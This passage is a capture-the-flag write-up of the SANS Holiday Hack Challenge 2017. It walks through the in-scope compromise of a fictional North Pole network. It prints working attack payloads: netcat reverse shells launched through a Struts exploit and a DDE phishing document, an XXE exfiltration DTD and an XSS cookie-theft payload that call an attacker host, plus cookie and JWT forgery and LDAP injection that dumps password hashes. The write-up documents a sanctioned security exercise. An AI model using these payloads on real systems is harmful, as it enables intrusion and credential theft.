![Holiday Hack Challenge 2017](./images/hhc-2017-banner.png)

SANS Holiday Hack Challenge 2017
================================

### ToC
- [Description](#description)
- [Scope](#scope)
- [Goals](#goals)
- [Writeup](#writeup)
    1.  [The First Page](#the-first-page)
    2.  [Meeting Alabaster Snowball](#meeting-alabaster-snowball)
    3.  [SMB Fun](#smb-fun)
    4.  [The Mail Server (EWA)](#the-mail-server)
    5.  [Threat Review](#threat-review)
    6.  [Elf as a Service (EaaS)](#elf-as-a-service)
    7.  [Elf Machine Interfaces (EMI)](#elf-machine-interfaces)
    8.  [North Pole Elf Database](#north-pole-elf-database)
    9.  [Villain](#villian)
    10. [Game](#game)
    11. [Conclusion](#conclusion)

### Description

This year's Holiday Hack Challenge was a lot of fun, the title 'Wintered' based
on the novel & musical 'Wicked'.

The music was very well done featuring some well known artists, and the levels
went into the realm of 3D which was very interesting to play & hack through.

### Scope

(Snippet taken from https://holidayhackchallenge.com/2017/)

```
SCOPE: For this entire challenge, you are authorized to attack ONLY the Letters
to Santa system at l2s.northpolechristmastown.com AND other systems on
the internal 10.142.0.0/24 network that you access through the Letters to
Santa system.  You are also authorized to download data
from nppd.northpolechristmastown.com, but you are not authorized to exploit
that machine or any of the North Pole and Beyond puzzler, chat, and video game
components of the Holiday Hack Challenge.
```

### Goals

1) Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball.
   What is the title of that page?

2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com.
   What is the topic of The Great Book page available in the web root of the server?
   What is Alabaster Snowball's password?

3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence.
   Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server.
   What is the file server share name?

4) Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com.
   What can you learn from The Great Book page found in an e-mail on that server?

5) How many infractions are required to be marked as naughty on Santa's Naughty and Nice List?
   What are the names of at least six insider threat moles?
   Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?

6) The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com.
   Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt.
   Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?

7) Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets.
   These systems serve many uses, including email access and web browsing.
   Gain access to the EMI server through the use of a phishing attack with your access to the EWA server.
   Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?

8) Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com.
   Who wrote the letter?

9) Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?
   (To answer this question, you need to fetch at least five of the seven pages of The Great Book
    and complete the final level of the North Pole and Beyond.)


### Writeup

#### The First Page

##### Questions

- What is the title of that page?  'About This Book...'

The first page was found by playing the level Winter Wonder Landing and hitting the Great Page sprite
on the right of the level.

##### Solution:

- What is the title of that page?  'About This Book...'
- SHA1 Proof: 6dda7650725302f59ea42047206bd4ee5f928d19


#### Meeting Alabaster Snowball

##### Questions

- What is the topic of The Great Book page available in the web root of the server?
- What is Alabaster Snowball's password?

##### Process

Starting out with https://l2s.northpolechristmastown.com/ there is a "Letters to Santa" form
which posts to `/process.php` but doesn't seem particularly interesting after manually fuzzing it for a while.

![Letters to Santa](./images/l2s.png)

If we look in the source we find: 

```html
<!-- Development version -->
<a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>
```

This looks like a great next place to look, the `dev` subdomain.
This takes us to https://dev.northpolechristmastown.com/orders.xhtml, and at the very bottom we see:

```
Powered By: Apache Struts
```

![Dev Domain](./images/dev.png)

This seems like a clear enough hint that the server is running Apache Struts, and maybe we should look
for an exploit targeting struts.

If we generate a 404 we can also see the server is running `Apache Tomcat/6.0.41` - https://dev.northpolechristmastown.com/404

Looking up more information about Apache Struts exploits, this blog post was found with an almost identical website setup - http://robwillis.info/2017/09/exploiting-apache-struts-cve-2017-9805/

Using the same exploit they used in the blog post worked right away - https://www.exploit-db.com/exploits/42627/
Running this script for CVE-2017-9805 with the following arguments allowed a foothold into the network:

```sh
python struts-42627.py https://dev.northpolechristmastown.com "nc -e /bin/sh [ip-addr] 4343"
```

(A copy of the struts exploit used can be found [here](./scripts/struts-exploit/struts-42627.py))

Looking in `/var/www/html` we find the next GreatBookPage, #2:

```sh
alabaster_snowball@l2s:/var/www/html$ ls -la
ls -la
total 1772
drwxrwxrwt 6 www-data           www-data              4096 Dec 17 10:30 .
drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:03 css
drwxr-xr-x 3 root               www-data              4096 Oct 12 19:40 fonts
-r--r--r-- 1 root               www-data           1764298 Dec  4 20:25 GreatBookPage2.pdf
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:14 imgs
-rw-r--r-- 1 root               www-data             14501 Nov 24 20:53 index.html
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:11 js
-rwx------ 1 www-data           www-data               231 Oct 12 21:25 process.php
-rw-r--r-- 1 alabaster_snowball alabaster_snowball     340 Dec 17 10:32 s.php
```

It was also useful to find the other hosts within `/etc/hosts`:

```sh
alabaster_snowball@l2s:/var$ cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost l2s dev.northpolechristmastown.com l2s.northpolechristmastown.com
10.142.0.5      mail.northpolechristmastown.com ewa.northpolechristmastown.com
10.142.0.13     eaas.northpolechristmastown.com
10.142.0.6      edb.northpolechristmastown.com
::1             localhost l2s ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

Also if we recursively grep in the tomcat web root, we find alabaster's password:

```sh
labaster_snowball@l2s:/opt/apache-tomcat/webapps/ROOT/WEB-INF$ grep -rnsi password .
<-tomcat/webapps/ROOT/WEB-INF$ grep -rnsi password .
./classes/org/demo/rest/example/OrderMySql.class:4:            final String password = "stream_unhappy_buy_loss";
./classes/org/demo/rest/example/OrderMySql.class:5:            String connectionURL = "jdbc:mysql://" + host + ":3306/db?user=;password=";
./classes/org/demo/rest/example/OrderMySql.class:12:           connection = (Connection) DriverManager.getConnection(connectionURL,      username, password);
```

The password being: `stream_unhappy_buy_loss`

It may also be worth noting, this exploit dropped us into an unrestricted shell.  The user `alabaster_snowball` is setup to use
`rbash` by default, this was only an issue again if we SSH in using Alabaster's password.

##### Solution:

- The topic of The Great Book page available at the root of the webserver is: "On the Topic of Flying Animals"
- Alabaster's password is: `stream_unhappy_buy_loss`


#### SMB Fun

##### Questions

What is the file server share name?

##### Process

To gain access to the SMB server on the internal network shared with `dev.northpolechristmastown.com`.  We first need
to find the SMB server, then forward the traffic to a box which can run smbclient or similar software to interact with the share.

To discover the SMB server, we can use nmap to scan for it.  Initially it was not found, but through a hint from `Holly Evergreen`
it showed up right away:

```sh
$ nmap -Pn -T5 -PS445 10.142.0.0/24
...
  Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
  Host is up (0.00036s latency).
  Not shown: 996 filtered ports
  PORT     STATE SERVICE
  135/tcp  open  msrpc
  139/tcp  open  netbios-ssn
  445/tcp  open  microsoft-ds
  3389/tcp open  ms-wbt-server
...
```

Next we need to forward the SMB traffic through SSH to interact using our local smbclient tool.

```sh
$ ssh -L :445:10.142.0.7:445 alabaster_snowball@dev.northpolechristmastown.com
```

Now we can connect, which identifies the share name and we can dump the files found:

```sh
$ smbclient -U alabaster_snowball -L localhost
Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]

  Sharename       Type      Comment
  ---------       ----      -------
  ADMIN$          Disk      Remote Admin
  C$              Disk      Default share
  FileStor        Disk
  IPC$            IPC       Remote IPC

$ smbclient //localhost/FileStor -U alabaster_snowball
smb: \>
smb: \> dir
  .                                   D        0  Wed Dec  6 16:51:46 2017
  ..                                  D        0  Wed Dec  6 16:51:46 2017
  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 16:44:17 2017
  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 14:21:44 2017
  MEMO - Calculator Access for Wunorse.docx      A   111852  Mon Nov 27 14:01:36 2017
  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 16:47:28 2017
  Naughty and Nice List.csv           A    10245  Thu Nov 30 14:42:00 2017
  Naughty and Nice List.docx          A    60344  Wed Dec  6 16:51:25 2017

smb: \> mget *
getting file \BOLO - Munchkin Mole Report.docx of size 255520 as BOLO - Munchkin Mole Report.docx (440.1 KiloBytes/sec) (average 946.8 KiloBytes/sec)
getting file \GreatBookPage3.pdf of size 1275756 as GreatBookPage3.pdf (2857.5 KiloBytes/sec) (average 1312.3 KiloBytes/sec)
getting file \MEMO - Calculator Access for Wunorse.docx of size 111852 as MEMO - Calculator Access for Wunorse.docx (379.3 KiloBytes/sec) (average 1207.6 KiloBytes/sec)
getting file \MEMO - Password Policy Reminder.docx of size 133295 as MEMO - Password Policy Reminder.docx (452.0 KiloBytes/sec) (average 1131.4 KiloBytes/sec)
getting file \Naughty and Nice List.csv of size 10245 as Naughty and Nice List.csv (35.0 KiloBytes/sec) (average 1031.6 KiloBytes/sec)
getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.docx (206.0 KiloBytes/sec) (average 962.7 KiloBytes/sec)
```

##### Solution:

- The Share name is: `FileStor`


#### The Mail Server

##### Questions

- What can you learn from The Great Book page found in an e-mail on 'http://mail.northpolechristmastown.com'?

##### Process

![Elf Mail Access](./images/ewa.png)

First we must be able to access http://mail.northpolechristmastown.com, so we'll do the same SSH forwarding trick above
but this time on port 3000 where the webserver lives as seen on the port scan:

```sh
Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a2:e1:13:76:90:55:e9:8e:8d:13:a1:0f:91:e7:1a:79 (RSA)
|_  256 85:49:03:ca:3e:79:aa:02:02:d7:9d:29:49:db:83:fe (ECDSA)
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/cookie.txt
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
143/tcp  open  imap    Dovecot imapd
|_imap-capabilities: have IMAP4rev1 SASL-IR AUTH=PLAIN LITERAL+ LOGIN-REFERRALS post-login OK listed capabilities Pre-login AUTH=LOGINA0001 ID more IDLE ENABLE
2525/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
3000/tcp open  http    Node.js Express framework
| http-robots.txt: 1 disallowed entry
|_/cookie.txt
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Again this is what the forwarding command will look like:

```sh
ssh -L :5555:10.142.0.5:3000 alabaster_snowball@dev.northpolechristmastown.com
```

And now we can access localhost:5555 in our browser to check out the mail page.

Looking at /robots.txt it shows the following:

```sh
User-agent: *
Disallow: /cookie.txt
```

Checking out `http://localhost:5555/cookie.txt` we see the following useful snippet:

```js
//FOUND THESE FOR creating and validating cookies. Going to use this in node js
    function cookie_maker(username, callback){
        var key = 'need to put any length key in here';
        //randomly generates a string of 5 characters
        var plaintext = rando_string(5)
        //makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
        //Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
        var ciphertext = aes256.encrypt(key, plaintext).replace(/\=/g,'');
        //Setting the values of the cookie.
        var acookie = ['IOTECHWEBMAIL',JSON.stringify({"name":username, "plaintext":plaintext,  "ciphertext":ciphertext}), { maxAge: 86400000, httpOnly: true, encode: String }]
        return callback(acookie);
    };
    function cookie_checker(req, callback){
        try{
            var key = 'need to put any length key in here';
            //Retrieving the cookie from the request headers and parsing it as JSON
            var thecookie = JSON.parse(req.cookies.IOTECHWEBMAIL);
            //Retrieving the cipher text 
            var ciphertext = thecookie.ciphertext;
            //Retrievingin the username
            var username = thecookie.name
            //retrieving the plaintext
            var plaintext = aes256.decrypt(key, ciphertext);
            //If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
            if (plaintext === thecookie.plaintext) {
                return callback(true, username);
            } else {
                return callback(false, '');
            }
        } catch (e) {
            console.log(e);
            return callback(false, '');
        }
    };
```

So we have some interesting developer PoC which shows the cookie creation method they may be using for this site!
Looking back at the main page, sure enough we can see a cookie in the same format:

```js
{"name":"GUEST","plaintext":"","ciphertext":""}
```

At this point it seems like we should be able to login if we can create a cookie where the key no longer matters.

Looking at the hints we have:

- I'm so excited for the new email system that Alabaster Snowball set up for us. He spent a lot of time working on it. Should make it very easy for us to share cookie recipes. I just hope that he cleared up all his dev files. I know he was working on keeping the dev files from search engine indexers.
- The new email system's authentication should be impenetrable. Alabaster was telling me that he came up with his own encryption scheme using AES256, so you know it's secure.
- AES256? Honestly, I don't know much about it, but Alabaster explained the basic idea and it sounded easy. During decryption, the first 16 bytes are removed and used as the initialization vector or "IV." Then the IV + the secret key are used with AES256 to decrypt the remaining bytes of the encrypted string.
- Hmmm. That's a good question, I'm not sure what would happen if the encrypted string was only 16 bytes long.
- Every year when Santa gets back from delivering presents to the good girls and boys, he tells us stories about all the cookies he receives. I love everything about cookies! Cooking them, eating them, editing them, decorating them, you name it!

Okay cool, so we have:
- custom encryption
- known lengths for all values
- encrypted string is only 16 bytes long
- 16 bytes get removed in AES256 for use as the IV

What happens if we take off enough bytes to make the ciphertext 16 bytes long as suggested,
and then make the plaintext empty?

Trying it out, it seems to make the key irrelevant!
Now we can set any user to login and the backend will accept it!

![Elf Web Access Account](./images/ewa-account.png)

The example code for this can be found [here](./scripts/mail/cookie-please.js).
This will require node and npm, running an `npm install` and `node cookie-please.js`.
Example output:

```js
{"name":"jessica.claus@northpolechristmastown.com","plaintext":"","ciphertext":"S1UEETYCY3U+RT88CkkVJQ"}
```

Editing the cookie on the page to this generated cookie allows us to refresh and login to the main Elf Webmail Access page.
We can also just change the `name` field, keeping the ciphertext the same to login as any user.

This exploit was first tested and successful with `alabaster.snowball@northpolechristmastown.com`, then
used in the phishing attack later with `jessica.claus@northpolechristmastown.com`.

An extra note about this, there seemed to be a small information leak on the server which I reported later on,
it was an issue in bodyparser, which was interesting to see - https://github.com/CounterHack/HolidayHack2017/issues/16

##### Solution:

Looking through the messages, we eventually find a message from `mary.sugerplum@northpolechristmastown.com` titled:
`Re: Lost book page`, which contains the following body:

```
Ill save it for Santa along with the other one I have on my computer. 
Pulling it down now via nc.exe "like a boss".


On 12/5/2017 9:10 AM, holly.evergreen@northpolechristmastown.com wrote:
> Hey Santa,
>
> Found this lying around. Figured you needed it.
>
> http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf 
>
>
> :)
>
> -Holly
>
```

Visiting http://localhost:5555/attachments/GreatBookPage4_893jt91md2.pdf we find the next page of the Great Book.

What we learn from the book:

- The book talks about fights between the Elves and Munchkins, how private militias were formed, a noteworthy one being "The Lollipop Guild"
- It is believed by various Elves "The Lollipop Guild" is engaging in offensive operations against the North Pole
- It is important to protect the North Pole production - "Santa's Christmas Day present delivery operation", the blue team has rolled out "Blue Christmas" for analysis and defense during this time
- It is thought that the Munchkins are disguising themselves as Elves in the North Pole


#### Threat Review

##### Questions

- How many infractions are required to be marked as naughty on Santa's Naughty and Nice List?
- What are the names of at least six insider threat moles?
- Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?

##### Process

To find the amount of infractions required to be marked naughty on Santa's Naughty and Nice List we should
start by looking at the Naughty and Nice list compared against the nppd database.

![NPPD](./images/nppd.png)

We can find the nppd database [here](https://nppd.northpolechristmastown.com/infractions), and dump the json easily by providing an early date (`date>1000-01-01`), then clicking the
`Download` button at the bottom of the page.  The same data could be downloaded here - https://nppd.northpolechristmastown.com/infractions?query=date%3E1000-01-01&json=1

This file was renamed to `out.json`.

Running [jq](https://stedolan.github.io/jq/) against this file, we can enumerate the amount of infractions it found:

```sh
$ jq .count out.json
999
```

To analyze this json data, it seemed like a good opportunity to use Node again.
First it seems useful to grab the Naughty & Nice lists from the BOLO data we acquired from the SMB server.
This data was thrown into a new `json` file called `known.json` so we could easily pull it in to an analysis script.
Additionally the information for confirmed moles was also added to `known.json` under `moles`. (Mole data found from `BOLO - Munchkin Mole Report.docx`)

Entering the script, the first thing to help organize this data is to group infractions by name:

```js
const groupedInfractions = {};

infractions.forEach(x => {
  groupedInfractions[x.name] = groupedInfractions[x.name] || [];
  groupedInfractions[x.name].push(x);
});
```

Next we can query the data from the `nppd` dump for the Naughty & Nice lists found in the BOLO:

```js
const naughtyFound = Object.keys(groupedInfractions)
  .filter(name => known.naughty.indexOf(name) !== -1)

const niceFound = Object.keys(groupedInfractions)
  .filter(name => known.nice.indexOf(name) !== -1)
```

We can then get the infraction count, and check what the minimum and maximum infractions are:

```js
const getInfractionCount = list => {
  return list.map(value =>
    groupedInfractions[value].length
  ).sort()
};

const minNaughtyCount = Math.min(...getInfractionCount(naughtyFound))
const maxNiceCount = Math.max(...getInfractionCount(niceFound))
```

With the result of `minNaughtyCount` and `maxNiceCount` we can see Nice caps out at 3, whereas
Naughty starts at 4, making the obvious infraction count required to land on the Naughty List 4.

Now we need to know more names from the mole list.  Currently we have two moles identified from the BOLO which are:

- Bini Aru
- Boq Questrian

Querying for their infractions, we can create a set that allows us to find others with similar infractions:

```js
const moleInfractions = new Set(infractions.filter(inf => {
  return known.moles.indexOf(inf.name) !== -1;
}).map(x => x.title));
```

Then we query the `nppd` database for individuals with three or more similar infractions to the moles
and for an added precaution make sure they fall under the naughty list by checking their total infractions
are greater than 3.

```js
const molesFound = Object.keys(groupedInfractions).filter(name => {
  const curInfractions = groupedInfractions[name];
  const moleInfractionsFound = curInfractions.reduce((acc, infr) =>
    acc + (moleInfractions.has(infr.title) ? 1 : 0), 0);

  return moleInfractionsFound >= 3 && groupedInfractions[name].length >= 4;
});
```

The full list of these potential moles can be found in the solution below.

The final analysis code can be found [here](./scripts/analysis/analysis.js)

(Also was fun to find Dr. Who in the naughty list as a reference to last year's villain)

##### Solution

- It takes 4 infractions to land on the naughty list.
- The following list are potential moles to look into:
    - Nina Fitzgerald
    - Lance Montoya
    - Bini Aru
    - Josephine Howard
    - Manuel Graham
    - Beverly Khalil
    - Erin Tran
    - Charmaine Joseph
    - Wesley Morton
    - Kirsty Evans
    - Boq Questrian
    - Sheri Lewis
- The Abominable Snow Monster was throwing giant snowballs from the top of the North Pole Mountain
    - This was found after beating the Bumbles Bounce level
    - The proof of this can be found from the conversation below

![Bumble Message](./images/bumble-and-sam-proof.png)


#### Elf as a Service

##### Questions

- What is the title of The Great Book page?

##### Process

Fowarding the eaas server (10.142.0.13), so we can view it locally.
When we get to the index page we're presented with three options:

- EC2: Elf Checking System 2.0 (View XML Data)
- Elf Reset (Reset XML Data)
- Download (Download Elfdata.xml template)

![EaaS](./images/eaas.png)

Before attempting to solve this, I had followed Ed Skoudis' twitter feed closely before the
challenge and saw a mention of XXE attacks in relation to HHC!  It was exciting to see that
we would get an XXE challenge this year, and I was sure this was it.

This is the blog post - https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities/

This challenge was also solvable by following the blog post fairly closely.

First we stand up a server with a malicious `evil.dtd` file on port 8000 (`python -m SimpleHTTPServer 8000`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://[attacker-ip]:8888/?%stolendata;'>">
```

Then we capture the output of our target file we're extracting on port 8888:

```sh
nc -lp 8888 > greatbook.txt
```

Then we upload the payload referring to that server on EaaS (upload at bottom of http://eaas.northpolechristmastown.com/Home/DisplayXML):

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE demo [
    <!ELEMENT demo ANY >
    <!ENTITY % extentity SYSTEM "http://[attacker-ip]:8000/evil.dtd">
    %extentity;
    %inception;
    %sendit;
    ]
>
```

After that is uploaded, it'll trigger our payload, we can see it download the second part and if we check `greatbook.txt` we get:

```sh
GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1
```

Now when we visit that page we get the next Great Book Page.

##### Solution

- The title of the Great Book Page #6 is: "The Dreaded Inter-Dimensional Tornados"


#### Elf Machine Interfaces

##### Questions

  - Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?

##### Process

On this challenge we are tasked to phish Alabaster Snowball.
There were traces of emails stating that Alabaster will open anything with the subject 'gingerbread cookie recipe'.
So we should send him a malicious document to open with that subject.

Creating the malicious docx was fairly straight-forward when using the hints.
Following the blogpost was very useful about DDE and helped produce the payload below:
https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

This was the final payload created, and inserted as a formula field code: 

```sh
DDEAUTO c:\\windows\\system32\\cmd.exe "/c nc -e c:\windows\system32\cmd.exe [attacker-ip] 80"
```

![Gingerbread Cookie Recipes](./images/docx-payload.png)

We create a remote listener on port 80 from the [attacker-ip]:

```sh
$ nc -nvvvlp 80
```

Included in the doucment was a real gingerbread recipe.  We want to attack the box, but we also want to help.

The original query was to Jessica Claus, so we login into her account to send the message.
Using the previous cookie exploit, we login and send an email to 'alabaster.snowball@northpolechristmastown.com'
with the subject 'gingerbread cookie recipe', the body contains a simple message about the attachment being
the recipe.

Attaching our malicious docx containing the DDE exploit, we wait for a shell on the attacker server.

![Phishing Phun](./images/elf-mail-send.png)

We get a shell back from our payload where we can now extract the `GreatBookPage7.pdf` from `C:\`

```
C:\Users\alabaster_snowball\Documents>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9454-C240

 Directory of C:\

12/04/2017  08:42 PM         1,053,508 GreatBookPage7.pdf
11/14/2017  07:57 PM    <DIR>          inetpub
09/12/2016  11:35 AM    <DIR>          Logs
12/05/2017  05:00 PM    <DIR>          Microsoft
07/16/2016  01:23 PM    <DIR>          PerfLogs
11/15/2017  02:35 PM    <DIR>          Program Files
11/14/2017  08:24 PM    <DIR>          Program Files (x86)
11/15/2017  03:03 PM    <DIR>          python
11/14/2017  08:39 PM    <DIR>          Users
11/30/2017  06:23 PM    <DIR>          Windows
               1 File(s)      1,053,508 bytes
               9 Dir(s)  37,976,875,008 bytes free
```

Starting another listener on the remote host, we can pull the target file:

```sh
$ nc -lp 8888 > greatbookpage-7.pdf
```

Pushing the file from the shell we have established:

```sh
nc [attacker-ip] 8888 < GreatBookPage7.pdf
```

##### Solution

The great book describes the witches of Oz who are among the most
powerful, each having different attitudes: some good, some bad.
During the great Schism the witches remained neutral and they only
live within Oz, as of the writing there were no reports of witches
being observed in the North Pole.


#### North Pole Elf Database

##### Questions

  - Who wrote the letter?

##### Process

First looking at the server's source we can see some code handling the login logic:

```js
if (!document.cookie) {
    window.location.href = '/';
} else {
    token = localStorage.getItem("np-auth");
    if (token) {
        $.post( "/login", { auth_token: token }).done(function( result ) {
            if (result.bool) {
                window.location.href = result.link;
            }
        })
    }
}
```

It looks like there's some token being used from local storage called `np-auth`, this will come in handy later.

Attempting to login with Alabaster's email and password does not seem to work.

If we look at `/robots.txt` we see `Disallow: /dev`.
Checking `/dev` we see a directory listing with one file `LDIF_template.txt`, looking at this we get:

```sh
#LDAP LDIF TEMPLATE

dn: dc=com
dc: com
objectClass: dcObject

dn: dc=northpolechristmastown,dc=com
dc: northpolechristmastown
objectClass: dcObject
objectClass: organization

dn: ou=human,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: human

dn: ou=elf,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: elf

dn: ou=reindeer,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: reindeer

dn: cn= ,ou= ,dc=northpolechristmastown,dc=com
objectClass: addressbookPerson
cn: 
sn: 
gn: 
profilePath: /path/to/users/profile/image
uid: 
ou: 
department: 
mail: 
telephoneNumber: 
street:
postOfficeBox: 
postalCode: 
postalAddress: 
st: 
l: 
c: 
facsimileTelephoneNumber: 
description: 
userPassword: 
```

Looks like some useful ldap information!

Now to find some way to get access, there's a support button on the front page.
Clicking that support button we can see a field to fill out information.  Maybe this is a CSRF or XSS challenge!
Looking at the hints, it guides us towards the XSS route but also mentions `script` has been blacklisted.

Wunorse Openslae gave the following hints:

- Many people don't know this, but most of us elves have multiple jobs here in the North Pole. In addition to working in Santa's workshop, I also work as a help desk support associate for the North Pole Elf Database site. I answer password reset requests, mostly from other elves.
- One time, I got a weird email with a JavaScript alert and my account got hacked. Fortunately, Alabaster was able to add some filtering on the system to prevent that from happening again. I sure hope he tested his changes against the common evasion techniques discussed on the XSS filter evasion cheat sheet.
- It's never a good idea to come up with your own encryption scheme with cookies. Alabaster told me he uses JWT tokens because they are super secure as long as you use a long and complex key. Otherwise, they could be cracked and recreated using any old framework like pyjwt to forge a key.
- The interface we use lets us query our directory database with all the employee information. Per Santa's request, Alabaster restricted the search results to just the elves and reindeer. Hopefully, he secured that too. I found an article recently talking about injection against similar databases.

It hints at checking out the OWASP filter evasion cheatsheet hoping alabaster saw it, which we know wasn't considered because of the hint.
We fill out the form to match the following:
username: alabaster.snowball
email: alabaster.snowball@northpolechristmastown.com
message: <img src=x onerror=this.src='http://[attacker-ip]:8888/?c='+localStorage.getItem("np-auth")>

We get a page showing a Password Reset ticket for Alabaster Snowball.

![password reset](./images/north-pole-elfdb-req.png)

Then we run a server on the attacker ip on 8888 and get the following response:

```sh
GET /?c=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1
```

This looks like JWT as mentioned in the hints!
Decoding the readable parts we get:

- `{"alg":"HS256","typ":"JWT"}`
- `{"dept":"Engineering","ou":"elf","expires":"2017-08-16 12:00:47.248093+00:00","uid":"alabaster.snowball"}`

Looks like more ldap data, and the user captured is Alabaster Snowball. Attempting to login with this won't work initially because of the expiration.
We'll need to crack this JWT, set a high expiration and the ability to set any user we need to login as.

First we need to crack the JWT token, to do this we'll use [JTR](http://www.openwall.com/john/).
To convert to something john can read, we can use something like [this](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py), it mainly takes the
last b64 value, converts it to hex, and separates the front by a `#`.

The key is found after a couple minutes as `3lv3s`.  Now we can use this along with PyJWT to form a new token!

```sh
pyjwt --key=3lv3s encode dept=Engineering ou=elf expires="2018-08-16 12:00:47.248093+00:00" uid="alabaster.snowball"
```

Now we can use this token by setting the `np-auth` token in the browser console:

```js
localStorage.setItem('np-auth', [token-goes-here]);
```

![set local storage](./images/add-local-storage-item.png)

Refreshing the page we're logged in and at the Personnel Search.
This Personnel search like the spot with LDAP injection, mentioned in another SANS blog post - https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap

The UI in this post was also almost identical.  
Instead of changing the field in the HTML, I decided to pull this onto the command-line with curl.
By going to the network tab you can query for something simple, then right click on the request, Copy > Copy as cURL.

Pasting this in the terminal and hitting ctrl+x+e we can edit this in vim, splitting the lines by -H (`:%s/-H/-H \\\r/g`).
Now we can eliminate any unnecessary information to keep this as simple as possible (All we care about is `np-auth` and `--data`).

As suggested in the article, adding `))(department=*)(|(cn=` ended up opening up the query so we could find sensitive data.
The curl data attribute looks like the following: `--data 'name=))(department=*)(|(cn=&isElf=False&attributes=*'`.
This will dump all the users password hashes including `alabaster.snowball`, `santa.claus` and `jessica.claus`.

There's also another part to this challenge which is the `Account > Santa Panel`.
This `Santa Panel` will display a message saying "You must be a Claus to access this panel!" if you do not have the
appropriate authorization.

To login as one of the Claus', we will need to crack their password.
We can grab Santa's password from the LDAP Injection dump under `userPassword` - `d8b4c05a35b0513f302a85c409b4aab3`.
Googling this hash we find it turns out to be `001cookielips001`. (Found on https://isc.sans.edu/tools/reversehash.html)
Now we can login again to this portal with the username `santa.claus` and password shown above.
When we look at `Account > Santa Panel`, we enter the password again and get a wish list from `The Wizard` from
`The Wizard of Oz`.

##### Solution

- `The Wizard of Oz` wrote the message


#### Villian

##### Questions

  - Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?

##### Process

After getting at least 5 Great Book Pages and completing all the levels, it was time to find where the final
villain achievement was.

In the level "I don't think we're in Kansas anymore", going through the inter-dimensional tornado and through
a portal into the barn gives us the final cutscene, showing the villain with this message:

```
It's me, Glinda the Good Witch of Oz! You found me and ruined my genius plan!
